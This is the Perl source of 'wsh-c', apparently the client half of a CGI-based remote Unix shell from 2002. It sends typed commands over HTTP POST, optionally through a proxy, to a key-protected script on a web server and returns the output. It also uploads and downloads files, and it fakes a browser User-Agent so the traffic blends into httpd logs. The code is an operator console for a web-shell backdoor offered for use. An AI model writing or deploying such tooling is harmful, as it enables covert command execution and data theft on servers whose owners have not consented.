# wsh-c - cgi based remote unix shell (client part)
# by Alex Dyatlov <alex@dyatlov.ru>
# April, 2002
#
# INSTALL
# Module Term::ReadLine::Gnu installation is recommended, get:
# 1) readline-4.2a.tar.gz or later from
#    http://www.gnu.org/directory/readline.html
# 2) ReadLine-Gnu-1.12.tar.gz or later from
#    http://search.cpan.org/search?dist=Term-ReadLine-Gnu
#
# SHELL COMMANDS
# exit		as is
# history	show commands history
# !<number>	execute command with history <number>
# wshget <file> get <file> from remote host to local directory
# wshput <file> put <file> from local directory to remote host
use strict;

use IO::Socket;
use Term::ReadLine;
use POSIX qw(:sys_wait_h);

#--- config - begin ----------------------------------->8--
my $use_proxy = 1; 		#--- (0 || 1) connect directly or use HTTP proxy
my $host = "111.222.33.4";	#--- proxy ip here if $use_proxy = 1
my $port = 3128;		#--- proxy port
my $http_port = 80;		#--- default HTTP port
my $agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"; #--- for httpd logs
my $anticache = 0;		#--- (0 || 1) add '?<random_number>' to URL

my $shell_prompt = "wsh#";
my $pwd = "/";			#--- 'home' directory on remote host
my $pattern = "STCOM";
#--- config - end ------------------------------------->8--

my $VERSION = "1.0";
$ENV{PERL_RL} = " o=0"; # use best available ReadLine without ornaments

my $request = $ARGV[0];
my $shtam = $ARGV[1];
unless ($request && $shtam) {
	print "Usage: $0 host/dir/script KEY\n\n";
	exit -1;
}

my $hostname;
if ($request =~ /^([^\/]+)(.*)/s) {
	$hostname = $1;
	$request = $2
		if (!$use_proxy);
	if ($hostname =~ /([^:]+):(.*)/) {
		$hostname = $1;
		$http_port = $2;
	}
} else {
	print "unable to parse hostname from $ARGV[0]\n\n";
	exit -1;
}
if (!$use_proxy) {
	if ($hostname !~ /\d+\.\d+\.\d+\.\d+/) {
		(my $name, my $aliases, my $addrtype, my $length, my @addrs) =
			gethostbyname($hostname)
			or die "unable to resolve hostname '$hostname'\n\n";
		$host = join('.', unpack('C4', $addrs[0]));
	} else {
		$host = $hostname;
	}
	$port = $http_port;
} else {
	$request = "http://".$request;
}

my $term = Term::ReadLine->new("wsh");
my $OUT = $term->OUT() || *STDOUT;
my @h_list = ();
my $io;
my $file;
while (defined (my $cmd = $term->readline("$shell_prompt "))) {
	next if (length($cmd) == 0);
# wsh commands --- begin
	exit 0 if ($cmd =~ /^exit$/s);
	if ($cmd =~ /^history$/s) {
		my $h_counter = 1;
		foreach (@h_list) {
			print $OUT "  ".($h_counter++)."\t$_\n";
		}
		next;
	}
	if ($cmd =~ /^\!(\d+)$/s) {
		($1 > 0 && $1 <= scalar(@h_list)) ?
			$cmd = $h_list[$1-1] :
			next;
	}
	$io = undef;
	if ($cmd =~ /^wsh((get)|(put)) ['" ]*?([^'"]+)/s) {
		$io = $1;
		$file = $4;
		($pwd =~ /\/$/s) ?
			$cmd = "wsh$io \"$pwd$file\"" :
			$cmd = "wsh$io \"$pwd/$file\"";
		if ($io =~ /put/) {
			unless (open(FH, $file)) {
				print "$file: $!\n";
				next;
			}
			$cmd = join(//, ($cmd, <FH>));
			close(FH);
		}
	}
# wsh commands --- end
	push(@h_list, $cmd);
	if ($cmd =~ /^cd ['"]?([^'"; ]+)$/s) {
		my $dir = $1;
		if ($dir !~ /^\//s) {
			$pwd = "$pwd/$dir";
			$pwd =~ s/[^\/]+\/\.\.//g;
			$pwd =~ s/\/{2,}/\//g;
			$pwd =~ s/\/$//;
		} else {
			$pwd = $dir;
		}
		next;
	}
	$cmd = "if [ -d $pwd ];then cd $pwd;".
		"else echo 'cd: $pwd: No such file or directory';exit 0;fi;$cmd"
		unless (defined($io));
	my $cmd_s = $pattern;
	$cmd_s =~ s/ST/$shtam/;
	$cmd_s =~ s/COM/$cmd/;
	my $cmd_sl = length($cmd_s);
	my $socket = IO::Socket::INET->new(
		PeerAddr => $host,
		PeerPort => $port,
		Proto    => "tcp",
		Type     => SOCK_STREAM) or die $!;
	($anticache) ?
		print $socket "POST $request?".(int(rand(9999)))." HTTP/1.0\r\n" :
		print $socket "POST $request HTTP/1.0\r\n";
	print $socket
		"Content-Type: application/x-www-form-urlencoded\r\n".
		"User-Agent: $agent\r\n".
		"Host: $hostname\r\n".
		"Content-Length: $cmd_sl\r\n";
	($use_proxy) ?
		print $socket
			"Proxy-Connection: close\r\n".
			"Pragma: no-cache\r\n" :
		print $socket
			"Connection: close\r\n";
	print $socket
		"\r\n".
		"$cmd_s";
	my $cl = 0;
	my $crlf = 0;
	my @msg = ();
	while (my $str = <$socket>) {
		if (!$crlf && $str =~ /^\s*?$/s) {
			$crlf = 1;
			next;
		}
		$msg[$crlf] = $msg[$crlf].$str;
		if (!$cl && $crlf) {
			$cl = length($msg[0]) + 4;
			if ($msg[0] =~ /Content-Length: (\d+)/s) {
				$cl += $1;
			} else {
				$cl = -1;
			}
		}
		last if ($cl > 0 && length($msg[0].$msg[1])+4 >= $cl);
	}
	close($socket);
	if ($msg[0] !~ /^[^ ]+ 200/s) {
		print $OUT "HTTP request fail:\n\n$msg[0]\n";
		next;
	}
	if ($io =~ /get/) {
		if (length($msg[1]) > 0) {
			if (open(FH, "> $file")) {
				print FH $msg[1];
				close(FH);
			} else {
				print $OUT $!;
			}
		} else {
			print $OUT "wshget fail\n"
		}
	} else {
		print $OUT $msg[1];
	}
}
